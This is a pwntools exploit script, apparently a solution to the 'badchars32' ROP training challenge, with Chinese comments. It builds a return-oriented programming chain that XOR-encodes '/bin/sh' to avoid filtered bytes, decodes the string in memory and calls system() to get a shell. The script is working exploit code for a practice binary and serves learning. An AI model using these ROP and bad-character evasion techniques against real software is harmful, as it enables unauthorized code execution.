# # -*- coding: UTF-8 -*- 
from pwn import *
context.log_level = 'debug'
sh = process("./badchars32")
elf = ELF("./badchars32")

data_addr = 0x0804a038  # readelf -S badchars32 
system = elf.plt['system']
print(hex(system))
mov_edi_esi = 0x08048893 # mov dword ptr [edi], esi ; ret
pop_esi_edi = 0x08048899 # pop esi ; pop edi ; ret
xor_ebx_cl = 0x08048890  # xor byte ptr [ebx], cl ; ret  XOR 指令在两个操作数的对应位之间进行（按位）逻辑异或（XOR）操作，并将结果存放在目标操作数中
pop_ebx_ecx = 0x08048896 # pop ebx ; pop ecx ; ret

binsh = "/bin/sh\x00"

# encode 
badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while(1):   # 选择用于异或的值, 防止加密后还有坏字节
    xor_binsh = ""
    for i in binsh:
        c = ord(i) ^ xor_byte     # ord函数可以将字符转化为ASCII码
        if c in badchars:
            xor_byte += 1
            break
        else:
            xor_binsh += chr(c)   # chr是ord的逆函数, 根据传入的int类型参数返回对应的Unicode 码位的字符
    if len(xor_binsh) == 8:
        break

bin_str = xor_binsh[0:4]
sh_str = xor_binsh[4:8]

payload = b'a' * 0x2c
# payload += p32(pop_esi_edi) + xor_binsh[0:4].encode('utf-8') + p32(data_addr) + p32(mov_edi_esi)
# payload += p32(pop_esi_edi) + xor_binsh[4:8].encode('utf-8') + p32(data_addr+4) + p32(mov_edi_esi)
payload += p32(pop_esi_edi) + bytes(bin_str, encoding = 'ascii') + p32(data_addr) + p32(mov_edi_esi)
payload += p32(pop_esi_edi) + bytes(sh_str, encoding = 'ascii') + p32(data_addr+4) + p32(mov_edi_esi)

for x in range(0, len(xor_binsh)):
    payload += p32(pop_ebx_ecx) + p32(data_addr + int(x)) + p32(xor_byte) + p32(xor_ebx_cl)

payload += p32(system) + b'b' * 4 + p32(data_addr)

sh.sendline(payload)
sh.interactive()

